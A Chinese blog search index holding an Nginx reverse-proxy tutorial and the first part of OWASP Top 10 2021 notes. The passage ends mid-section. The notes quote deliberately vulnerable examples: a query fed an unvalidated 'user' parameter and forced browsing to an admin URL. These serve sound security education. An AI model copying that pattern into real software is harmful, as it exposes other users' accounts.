<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>什么是Nginx反向代理</title>
    <link href="/blog/2022/10/15/%E4%BB%80%E4%B9%88%E6%98%AFNginx%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86/"/>
    <url>/blog/2022/10/15/%E4%BB%80%E4%B9%88%E6%98%AFNginx%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86/</url>
    
    <content type="html"><![CDATA[<p>互联网冲浪的时候，感觉自己的一切言行都被打上了指纹，于是乎打算自己搞一个即时通讯工具玩的时候发现一个开源的即时通讯系统<a href="https://github.com/OpenIMSDK/Open-IM-Server">openIM</a>，搭建后端的时候发现可以用Nginx反向代理将流量转发到内网的不同主机上以实现负载均衡，瞬时感觉很神奇，接触到了之前不知道的东西，因此学习记录一下以备日后翻阅。</p><p><img src="/images/fj34.jpg"></p><span id="more"></span><h2 id="Nginx安装"><a href="#Nginx安装" class="headerlink" title="Nginx安装"></a>Nginx安装</h2><h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h3><p>阿里云免费领的ECS</p><p>操作系统：Ubuntu 18.04</p><h3 id="APT简易安装"><a href="#APT简易安装" class="headerlink" title="APT简易安装"></a>APT简易安装</h3><p>查看版本信息</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">apt-get update<br>apt show nginx<br></code></pre></td></tr></table></figure><p>结果：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">Package: nginx<br><span class="hljs-keyword">Version</span>: <span class="hljs-number">1.14</span><span class="hljs-number">.0</span><span class="hljs-number">-0</span>ubuntu1<span class="hljs-number">.10</span><br>Priority: optional<br>Section: web<br>Origin: Ubuntu<br>Maintainer: Ubuntu Developers &lt;ubuntu-devel-discuss@lists.ubuntu.com&gt;<br>Original-Maintainer: Debian Nginx Maintainers &lt;pkg-nginx-maintainers@lists.alioth.debian.org&gt;<br>Bugs: https://bugs.launchpad.net/ubuntu/+filebug<br>Installed-Size: <span class="hljs-number">44.0</span> kB<br><span class="hljs-keyword">Depends</span>: nginx-core (&lt;&lt; <span class="hljs-number">1.14</span><span class="hljs-number">.0</span><span class="hljs-number">-0</span>ubuntu1<span class="hljs-number">.10</span><span class="hljs-number">.1</span>~) | nginx-<span class="hljs-keyword">full</span> (&lt;&lt; <span class="hljs-number">1.14</span><span class="hljs-number">.0</span><span class="hljs-number">-0</span>ubuntu1<span class="hljs-number">.10</span><span class="hljs-number">.1</span>~) | nginx-light (&lt;&lt; <span class="hljs-number">1.14</span><span class="hljs-number">.0</span><span class="hljs-number">-0</span>ubuntu1<span class="hljs-number">.10</span><span class="hljs-number">.1</span>~) | nginx-extras (&lt;&lt; <span class="hljs-number">1.14</span><span class="hljs-number">.0</span><span class="hljs-number">-0</span>ubuntu1<span class="hljs-number">.10</span><span class="hljs-number">.1</span>~), nginx-core (&gt;= <span class="hljs-number">1.14</span><span class="hljs-number">.0</span><span class="hljs-number">-0</span>ubuntu1<span class="hljs-number">.10</span>) | nginx-<span class="hljs-keyword">full</span> (&gt;= <span class="hljs-number">1.14</span><span class="hljs-number">.0</span><span class="hljs-number">-0</span>ubuntu1<span class="hljs-number">.10</span>) | nginx-light (&gt;= <span class="hljs-number">1.14</span><span class="hljs-number">.0</span><span class="hljs-number">-0</span>ubuntu1<span class="hljs-number">.10</span>) | nginx-extras (&gt;= <span class="hljs-number">1.14</span><span class="hljs-number">.0</span><span class="hljs-number">-0</span>ubuntu1<span class="hljs-number">.10</span>)<br>Homepage: http://nginx.net<br>Supported: <span class="hljs-number">5</span>y<br>Download-Size: <span class="hljs-number">3</span>,<span class="hljs-number">596</span> B<br>APT-Sources: http://mirrors.cloud.aliyuncs.com/ubuntu bionic-updates/main amd64 Packages<br>Description: small, powerful, scalable web/proxy <span class="hljs-keyword">server</span><br> Nginx (&quot;engine X&quot;) <span class="hljs-keyword">is</span> a high-performance web <span class="hljs-keyword">and</span> <span class="hljs-keyword">reverse</span> proxy <span class="hljs-keyword">server</span><br> created <span class="hljs-keyword">by</span> Igor Sysoev. It can be used <span class="hljs-keyword">both</span> <span class="hljs-keyword">as</span> a standalone web <span class="hljs-keyword">server</span><br> <span class="hljs-keyword">and</span> <span class="hljs-keyword">as</span> a proxy <span class="hljs-keyword">to</span> reduce the <span class="hljs-keyword">load</span> <span class="hljs-keyword">on</span> back-<span class="hljs-keyword">end</span> HTTP <span class="hljs-keyword">or</span> mail servers.<br> .<br> This <span class="hljs-keyword">is</span> a dependency package <span class="hljs-keyword">to</span> install either nginx-<span class="hljs-keyword">full</span> (<span class="hljs-keyword">by</span> <span class="hljs-keyword">default</span>),<br> nginx-light <span class="hljs-keyword">or</span> nginx-extras.<br><br>N: There <span class="hljs-keyword">is</span> <span class="hljs-number">1</span> additional <span class="hljs-type">record</span>. Please use the <span class="hljs-string">&#x27;-a&#x27;</span> switch <span class="hljs-keyword">to</span> see it<br></code></pre></td></tr></table></figure><p>这里选择默认的nginx-full就可以，所以直接用<code>sudo apt-get install nginx</code>就是默认安装nginx-full</p><h3 id="安装目录说明"><a href="#安装目录说明" class="headerlink" title="安装目录说明"></a>安装目录说明</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/usr/</span>sbin/nginx：主程序，启动文件<br><span class="hljs-regexp">/etc/</span>nginx：存放配置文件<br><span class="hljs-regexp">/var/</span>www/html：存放项目目录<br><span class="hljs-regexp">/var/</span>log/nginx：存放日志  <br></code></pre></td></tr></table></figure><p>以上是通过apt默认安装的目录信息，可能随着版本不同有所变化</p><h3 id="nginx一些管理命令"><a href="#nginx一些管理命令" class="headerlink" title="nginx一些管理命令"></a>nginx一些管理命令</h3><figure class="highlight protobuf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs protobuf"><span class="hljs-keyword">service </span><span class="hljs-title class_">nginx</span> start<br><span class="hljs-keyword">service </span><span class="hljs-title class_">nginx</span> restart<br><span class="hljs-keyword">service </span><span class="hljs-title class_">nginx</span> stop<br></code></pre></td></tr></table></figure><h2 id="Nginx反向代理"><a href="#Nginx反向代理" class="headerlink" title="Nginx反向代理"></a>Nginx反向代理</h2><h3 id="什么是反向代理"><a href="#什么是反向代理" class="headerlink" title="什么是反向代理"></a>什么是反向代理</h3><p>用过“科学上网”的都知道，代理服务器是个什么东西，简单的用下面这张图来解释吧：</p><p><img src="/images/proxy_yuanli.png"></p><p>防火墙会拦截我们的谷歌的请求，但是不会拦截我们访问代理服务器的请求，那么我们就可以通过代理服务器访问谷歌。</p><p>那么什么是<strong>反向代理</strong>呢？</p><p>如下图所示，我们只需要将请求发送到反向代理服务器，由反向代理服务器去选择目标服务器获取数据后，再返回给客户端，此时反向代理服务器和目标服务器对外就是一个服务器，暴露的是代理服务器地址，隐藏了真实服务器 IP地址。</p><p><img src="/images/reproxy_yuanli.png"></p><h3 id="Nginx配置文件"><a href="#Nginx配置文件" class="headerlink" title="Nginx配置文件"></a>Nginx配置文件</h3><p>如果是使用apt默认安装的话，配置文件nginx.conf应该在<code>/etc/nginx/</code>目录下。</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">user</span> www-data;<br><span class="hljs-attribute">worker_processes</span> auto;<br><span class="hljs-attribute">pid</span> /run/nginx.pid;<br><span class="hljs-attribute">include</span> /etc/nginx/modules-enabled/<span class="hljs-regexp">*.conf</span>;<br><br><span class="hljs-section">events</span> &#123;<br><span class="hljs-attribute">worker_connections</span> <span class="hljs-number">768</span>;<br><span class="hljs-comment"># multi_accept on;</span><br>&#125;<br><br><span class="hljs-section">http</span> &#123;<br><br><span class="hljs-comment">##</span><br><span class="hljs-comment"># Basic Settings</span><br><span class="hljs-comment">##</span><br><br><span class="hljs-attribute">sendfile</span> <span class="hljs-literal">on</span>;<br><span class="hljs-attribute">tcp_nopush</span> <span class="hljs-literal">on</span>;<br><span class="hljs-attribute">tcp_nodelay</span> <span class="hljs-literal">on</span>;<br><span class="hljs-attribute">keepalive_timeout</span> <span class="hljs-number">65</span>;<br><span class="hljs-attribute">types_hash_max_size</span> <span class="hljs-number">2048</span>;<br><span class="hljs-comment"># server_tokens off;</span><br><br><span class="hljs-comment"># server_names_hash_bucket_size 64;</span><br><span class="hljs-comment"># server_name_in_redirect off;</span><br><br><span class="hljs-attribute">include</span> /etc/nginx/mime.types;<br><span class="hljs-attribute">default_type</span> application/octet-stream;<br><br><span class="hljs-comment">##</span><br><span class="hljs-comment"># SSL Settings</span><br><span class="hljs-comment">##</span><br><br><span class="hljs-attribute">ssl_protocols</span> TLSv1 TLSv1.<span class="hljs-number">1</span> TLSv1.<span class="hljs-number">2</span>; <span class="hljs-comment"># Dropping SSLv3, ref: POODLE</span><br><span class="hljs-attribute">ssl_prefer_server_ciphers</span> <span class="hljs-literal">on</span>;<br><br><span class="hljs-comment">##</span><br><span class="hljs-comment"># Logging Settings</span><br><span class="hljs-comment">##</span><br><br><span class="hljs-attribute">access_log</span> /var/log/nginx/access.log;<br><span class="hljs-attribute">error_log</span> /var/log/nginx/<span class="hljs-literal">error</span>.log;<br><br><span class="hljs-comment">##</span><br><span class="hljs-comment"># Gzip Settings</span><br><span class="hljs-comment">##</span><br><br><span class="hljs-attribute">gzip</span> <span class="hljs-literal">on</span>;<br><br><span class="hljs-comment"># gzip_vary on;</span><br><span class="hljs-comment"># gzip_proxied any;</span><br><span class="hljs-comment"># gzip_comp_level 6;</span><br><span class="hljs-comment"># gzip_buffers 16 8k;</span><br><span class="hljs-comment"># gzip_http_version 1.1;</span><br><span class="hljs-comment"># gzip_types text/plain text/css application/json application/javascript text/xml application/xml application/xml+rss text/javascript;</span><br><br><span class="hljs-comment">##</span><br><span class="hljs-comment"># Virtual Host Configs</span><br><span class="hljs-comment">##</span><br><br><span class="hljs-attribute">include</span> /etc/nginx/conf.d/<span class="hljs-regexp">*.conf</span>;<br><span class="hljs-attribute">include</span> /etc/nginx/sites-enabled/*;<br>&#125;<br><br><br><span class="hljs-comment">#mail &#123;</span><br><span class="hljs-comment">## See sample authentication script at:</span><br><span class="hljs-comment">## http://wiki.nginx.org/ImapAuthenticateWithApachePhpScript</span><br><span class="hljs-comment"># </span><br><span class="hljs-comment">## auth_http localhost/auth.php;</span><br><span class="hljs-comment">## pop3_capabilities &quot;TOP&quot; &quot;USER&quot;;</span><br><span class="hljs-comment">## imap_capabilities &quot;IMAP4rev1&quot; &quot;UIDPLUS&quot;;</span><br><span class="hljs-comment"># </span><br><span class="hljs-comment">#server &#123;</span><br><span class="hljs-comment">#listen     localhost:110;</span><br><span class="hljs-comment">#protocol   pop3;</span><br><span class="hljs-comment">#proxy      on;</span><br><span class="hljs-comment">#&#125;</span><br><span class="hljs-comment"># </span><br><span class="hljs-comment">#server &#123;</span><br><span class="hljs-comment">#listen     localhost:143;</span><br><span class="hljs-comment">#protocol   imap;</span><br><span class="hljs-comment">#proxy      on;</span><br><span class="hljs-comment">#&#125;</span><br><span class="hljs-comment">#&#125;</span><br></code></pre></td></tr></table></figure><p>上面是一份默认的配置文件，去除注释部分之后，整个配置文件大概可以分为三个部分。</p><h4 id="全局部分"><a href="#全局部分" class="headerlink" title="全局部分"></a>全局部分</h4><p>也就是最开始的部分，一直到events之前的部分，主要会设置一些影响<code>Nginx</code>服务器整体运行的配置指令，主要包括：配置运行Nginx服务器的用户（组）、允许生成的 <code>worker_process</code> 数，进程<code>PID</code>存放路径以及配置文件的引入等。<code>worker_process</code> 数是处理并发的关键配置，表示开启几个业务进程，值越大可以支持的并发处理数量越多，但是会受到设备限制。</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs gradle">user www-data;<br>worker_processes auto;<br>pid <span class="hljs-regexp">/run/</span>nginx.pid;<br><span class="hljs-keyword">include</span> <span class="hljs-regexp">/etc/</span>nginx<span class="hljs-regexp">/modules-enabled/</span>*.conf;<br></code></pre></td></tr></table></figure><h4 id="events部分"><a href="#events部分" class="headerlink" title="events部分"></a>events部分</h4><p>配置影响nginx服务器或与用户的网络连接。有每个进程的最大连接数，选取哪种事件驱动模型处理连接请求，是否允许同时接受多个网路连接，开启多个网络连接序列化等。</p><h4 id="http部分"><a href="#http部分" class="headerlink" title="http部分"></a>http部分</h4><p>可以嵌套多个server，配置代理，缓存，日志定义等绝大多数功能和第三方模块的配置。如文件引入，mime-type定义，日志自定义，是否使用sendfile传输文件，连接超时时间，单连接请求数等。</p><p><strong>server块</strong>：配置虚拟主机的相关参数，一个http中可以有多个server。</p><p><strong>location块</strong>：配置请求的路由，以及各种页面的处理情况，一个server块可以包含多个location。</p><p>下面配置指令参考<a href="https://www.runoob.com/w3cnote/nginx-setup-intro.html">Nginx 配置详解 | 菜鸟教程 (runoob.com)</a></p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-comment">########### 每个指令必须有分号结束。#################</span><br><span class="hljs-comment">#user administrator administrators;  #配置用户或者组，默认为nobody nobody。</span><br><span class="hljs-comment">#worker_processes 2;  #允许生成的进程数，默认为1</span><br><span class="hljs-comment">#pid /nginx/pid/nginx.pid;   #指定nginx进程运行文件存放地址</span><br><span class="hljs-attribute">error_log</span> log/<span class="hljs-literal">error</span>.log <span class="hljs-literal">debug</span>;  <span class="hljs-comment">#制定日志路径，级别。这个设置可以放入全局块，http块，server块，级别以此为：debug|info|notice|warn|error|crit|alert|emerg</span><br><span class="hljs-section">events</span> &#123;<br>    <span class="hljs-attribute">accept_mutex</span> <span class="hljs-literal">on</span>;   <span class="hljs-comment">#设置网路连接序列化，防止惊群现象发生，默认为on</span><br>    <span class="hljs-attribute">multi_accept</span> <span class="hljs-literal">on</span>;  <span class="hljs-comment">#设置一个进程是否同时接受多个网络连接，默认为off</span><br>    <span class="hljs-comment">#use epoll;      #事件驱动模型，select|poll|kqueue|epoll|resig|/dev/poll|eventport</span><br>    <span class="hljs-attribute">worker_connections</span>  <span class="hljs-number">1024</span>;    <span class="hljs-comment">#最大连接数，默认为512</span><br>&#125;<br><span class="hljs-section">http</span> &#123;<br>    <span class="hljs-attribute">include</span>       mime.types;   <span class="hljs-comment">#文件扩展名与文件类型映射表</span><br>    <span class="hljs-attribute">default_type</span>  application/octet-stream; <span class="hljs-comment">#默认文件类型，默认为text/plain</span><br>    <span class="hljs-comment">#access_log off; #取消服务日志    </span><br>    <span class="hljs-attribute">log_format</span> myFormat <span class="hljs-string">&#x27;<span class="hljs-variable">$remote_addr</span>–<span class="hljs-variable">$remote_user</span> [<span class="hljs-variable">$time_local</span>] <span class="hljs-variable">$request</span> <span class="hljs-variable">$status</span> <span class="hljs-variable">$body_bytes_sent</span> <span class="hljs-variable">$http_referer</span> <span class="hljs-variable">$http_user_agent</span> <span class="hljs-variable">$http_x_forwarded_for</span>&#x27;</span>; <span class="hljs-comment">#自定义格式</span><br>    <span class="hljs-attribute">access_log</span> log/access.log myFormat;  <span class="hljs-comment">#combined为日志格式的默认值</span><br>    <span class="hljs-attribute">sendfile</span> <span class="hljs-literal">on</span>;   <span class="hljs-comment">#允许sendfile方式传输文件，默认为off，可以在http块，server块，location块。</span><br>    <span class="hljs-attribute">sendfile_max_chunk</span> <span class="hljs-number">100k</span>;  <span class="hljs-comment">#每个进程每次调用传输数量不能大于设定的值，默认为0，即不设上限。</span><br>    <span class="hljs-attribute">keepalive_timeout</span> <span class="hljs-number">65</span>;  <span class="hljs-comment">#连接超时时间，默认为75s，可以在http，server，location块。</span><br><br>    <span class="hljs-section">upstream</span> mysvr &#123;   <br>      <span class="hljs-attribute">server</span> <span class="hljs-number">127.0.0.1:7878</span>;<br>      <span class="hljs-attribute">server</span> <span class="hljs-number">192.168.10.121:3333</span> backup;  <span class="hljs-comment">#热备</span><br>    &#125;<br>    <span class="hljs-attribute">error_page</span> <span class="hljs-number">404</span> https://www.baidu.com; <span class="hljs-comment">#错误页</span><br>    <span class="hljs-section">server</span> &#123;<br>        <span class="hljs-attribute">keepalive_requests</span> <span class="hljs-number">120</span>; <span class="hljs-comment">#单连接请求上限次数。</span><br>        <span class="hljs-attribute">listen</span>       <span class="hljs-number">4545</span>;   <span class="hljs-comment">#监听端口</span><br>        <span class="hljs-attribute">server_name</span>  <span class="hljs-number">127.0.0.1</span>;   <span class="hljs-comment">#监听地址       </span><br>        <span class="hljs-section">location</span>  ~*^.+$ &#123;       <span class="hljs-comment">#请求的url过滤，正则匹配，~为区分大小写，~*为不区分大小写。</span><br>           <span class="hljs-comment">#root path;  #根目录</span><br>           <span class="hljs-comment">#index vv.txt;  #设置默认页</span><br>           <span class="hljs-attribute">proxy_pass</span>  http://mysvr;  <span class="hljs-comment">#请求转向mysvr 定义的服务器列表</span><br>           <span class="hljs-attribute">deny</span> <span class="hljs-number">127.0.0.1</span>;  <span class="hljs-comment">#拒绝的ip</span><br>           <span class="hljs-attribute">allow</span> <span class="hljs-number">172.18.5.54</span>; <span class="hljs-comment">#允许的ip           </span><br>        &#125; <br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="Nginx配置反向代理"><a href="#Nginx配置反向代理" class="headerlink" title="Nginx配置反向代理"></a>Nginx配置反向代理</h3><p>实现效果：使用Nginx反向代理，根据访问的路径跳转到不同端口服务中，Nginx监听端口为80</p><ul><li>访问<a href="http://47.x.x.x/test1/%E8%B7%B3%E8%BD%AC%E5%88%B0192.168.1.1:8080">http://47.x.x.x/test1/跳转到192.168.1.1:8080</a></li><li>访问<a href="http://47.x.x.x/test2/%E8%B7%B3%E8%BD%AC%E5%88%B0192.168.1.2:8080">http://47.x.x.x/test2/跳转到192.168.1.2:8080</a></li></ul><p>修改Nginx配置文件：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">server</span> &#123;<br><span class="hljs-attribute">listen</span>       <span class="hljs-number">80</span>;<br><span class="hljs-attribute">server_name</span>  <span class="hljs-number">47</span>.x.x.x;<br><br><span class="hljs-section">location</span> <span class="hljs-regexp">~ /test1/</span> &#123;<br><span class="hljs-attribute">proxy_pass</span>  http://192.168.1.1:8080<br>&#125;<br><br>location <span class="hljs-regexp">~ /test2/</span> &#123;<br><span class="hljs-attribute">proxy_pass</span>  http://192.168.1.2:8080<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>根据上面的配置，当请求到达 Nginx 反向代理服务器时，会根据请求路径不同进行分发到不同的服务上。</p><h4 id="location匹配说明"><a href="#location匹配说明" class="headerlink" title="location匹配说明"></a>location匹配说明</h4><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">location</span> [ = | <span class="hljs-regexp">~ |</span> <span class="hljs-regexp">~* |</span><span class="hljs-regexp"> ^~]</span> uri &#123;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>&#x3D; ：用于不含正则表达式的 uri 前，要求请求字符串与 uri 严格匹配，如果匹配成功，就停止继续向下搜索并立即处理该请求<br><del>：用于表示 uri 包含正则表达式，并且区分大小写<br>~*：用于表示 uri 包含正则表达式，并且不区分大小写<br>^</del>：用于不含正则表达式的 uri 前，要求 Nginx 服务器找到标识 uri 和请求。字符串匹配度最高的 location 后，立即使用此 location 处理请求，而不再使用 location块中的正则 uri 和请求字符串做匹配。</p>]]></content>
    
    
    
    <tags>
      
      <tag>后端</tag>
      
      <tag>Nginx</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>OWASP Top 10 for 2021 学习笔记（上）</title>
    <link href="/blog/2022/10/13/OWASP-Top-10-for-2021-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <url>/blog/2022/10/13/OWASP-Top-10-for-2021-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<p><strong>最近一直在做的这个逻辑漏洞检测的项目，检测的漏洞类型多数都属于OWASP TOP 10，以后计划做安全开发，有必要学习一下最新的OWASP Top10 漏洞原理与防御技术。</strong></p><p><img src="/images/fj23.jpg"></p><span id="more"></span><h2 id="2021年最新版本的相较于2017年版本的变化"><a href="#2021年最新版本的相较于2017年版本的变化" class="headerlink" title="2021年最新版本的相较于2017年版本的变化"></a>2021年最新版本的相较于2017年版本的变化</h2><p>最新的OWASP Top 10相较于上一个版本有三个全新的分类，分别是：</p><ul><li>A04：不安全的设计</li><li>A08：软件和数据完整性失效</li><li>A10：SSRF服务器端请求伪造</li></ul><p>除此之外还有四个分类做了名称范围修正，并将有些类合并为一个类，如下图所示：</p><p><img src="/images/owasp2021.png"></p><h2 id="A01-权限控制失效"><a href="#A01-权限控制失效" class="headerlink" title="A01 权限控制失效"></a>A01 权限控制失效</h2><h3 id="简述"><a href="#简述" class="headerlink" title="简述"></a>简述</h3><p>从2017年的第五名晋升至2021年的第一名，94%的被测试的应用中都有被检测到某种类别权限控制失效的问题。著名的CWE包括：</p><ul><li><a href="https://cwe.mitre.org/data/definitions/200.html">CWE-200：向未经授权的行为者泄露敏感信息</a>：产品将敏感信息公开给未明确授权访问该信息的执行组件</li><li><a href="https://cwe.mitre.org/data/definitions/201.html">CWE-201：在发送的数据中插入敏感信息</a>：代码将数据传输到另一个执行组件，但部分数据包含该执行组件不应访问的敏感信息</li><li><a href="https://cwe.mitre.org/data/definitions/352.html">CWE-352： 跨站点请求伪造</a>：Web 应用程序不会或无法充分验证提交请求的用户是否有意提供格式良好、有效且一致的请求</li></ul><h3 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h3><p>存取控制强化策略，使用户不能采取在预期权限之外的行动。控制失效通常会导致未经授权的数据泄漏、修改或损坏所有数据，或执行超出用户权限的业务功能。常见的权限控制弱点包括：</p><ul><li>通过修改 URL、內部应用状态或 HTML 页面，或仅使用自定义 API 攻击工具来绕过存取控制检查。</li><li>允许主键被更改为其他用户的记录，允许查看或者编辑其他人员的账户。</li><li>特权提升。未登录用户拥有和登录用户权限，或者以用户身份登录拥有管理员权限。</li><li>元数据操作，例如重放或者篡改JSON 网站令牌(JWT)来存取控制令牌，或被操纵以提升特权或滥用 JWT 失效的 cookie 或隐藏域内容。</li><li><strong>CORS（跨域资源共享）</strong>错误配置允许未经授权的 API 存取。补充CORS是如何工作的：同源策略告诉浏览器阻止跨源请求。当你想从不同的源获取公共资源时，资源提供服务器需要告诉浏览器“请求来自的这个源可以访问我的资源”。浏览器记住这一点并允许跨源资源共享。<a href="https://zhuanlan.zhihu.com/p/414034535">CORS原理及解决办法</a></li><li>以未经身份验证的用户身份强制浏览已验证的页面或以标准用户身份存取特权页面。存取缺少存取控制的 API 以进行 POST、PUT 和 DELETE 操作。</li></ul><h3 id="预防方法"><a href="#预防方法" class="headerlink" title="预防方法"></a>预防方法</h3><p>存取控制仅在受信任的服务端代码或Serve-less API有效，攻击者无法修改这里的存取控制检查或元数据，比如：</p><ul><li>除公开资源外，默认为拒绝存取</li><li>一次性地建置存取控制机制，之后在整个应用中重复使用这些机制，包括最大限度地减少使用CORS。</li><li>存取控制措施应该强化记录所有权，而不是让用户可以创建、读取、更新或删除任何记录。</li><li>独特的应用程序业务限制需求应该由<strong>域模型（Domain model）</strong>强制执行。补充领域模型：领域模型是一个抽象系统，它描述了知识领域、影响力或活动的选定方面。该模型可以用来解决与该领域相关的问题。领域模型是与需要在软件中建模的领域相关的有意义的现实概念的表示。这些概念包括业务涉及的数据以及业务使用的与该数据相关的规则。（来自维基百科）</li><li>停用 Web 服务器目录列表，并确保档案元数据（例如，.git)和备份档案不在 web 根目录中。</li><li>记录访问控制失效，并在适当的情况下提醒管理员。</li><li>对 API 和控制器存取进行流量限制，以最小化自动攻击工具所带来的的损害。</li><li>JWT令牌登出后，在服务器端应该使其失效。</li></ul><p>开发人员和QA人员应该包括功能访问控制单元和集成测试。</p><h3 id="攻击情景实例"><a href="#攻击情景实例" class="headerlink" title="攻击情景实例"></a>攻击情景实例</h3><p><strong>情境 #1：</strong> 应用程序在存取账户资料的 SQL 查询中使用未经验证的资料：</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">pstmt.set<span class="hljs-constructor">String(1, <span class="hljs-params">request</span>.<span class="hljs-params">getParameter</span>(<span class="hljs-string">&quot;user&quot;</span>)</span>);<br><br>ResultSet results = pstmt.execute<span class="hljs-constructor">Query( )</span>;<br></code></pre></td></tr></table></figure><p>攻击者只需修改浏览器的“user”参数即可发送他们想要的任何账号。如果没有正确验证，攻击者可以存取任何用户的账户资料。</p><p><strong>情境 #2：</strong>攻击者强迫浏览某些目标网址，存取管理页面需要管理员权限。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>example.com<span class="hljs-regexp">/app/g</span>etappInfo<br><br>https:<span class="hljs-regexp">//</span>example.com<span class="hljs-regexp">/app/</span>admin_getappInfo<br></code></pre></td></tr></table></figure><p>如果未经身份验证的用户可以访问任一仅能身份验证过用户才能访问页面，那就是一个缺陷。 如果一个非管理员可以访问管理页面，这也是一个缺陷。</p><h2 id="A02-加密机制失效"><a href="#A02-加密机制失效" class="headerlink" title="A02 加密机制失效"></a>A02 加密机制失效</h2><h3 id="简述-1"><a href="#简述-1" class="headerlink" title="简述"></a>简述</h3><p>从2017年的第三名变为第二名，之前版本称为“敏感资料泄露”，更像是一种广泛的症状而不是根本原因，本版本聚焦于密码学相关的失效（或者缺乏加密），并因此常常导致敏感资料的泄露。著名的CWE包括：</p><ul><li><a 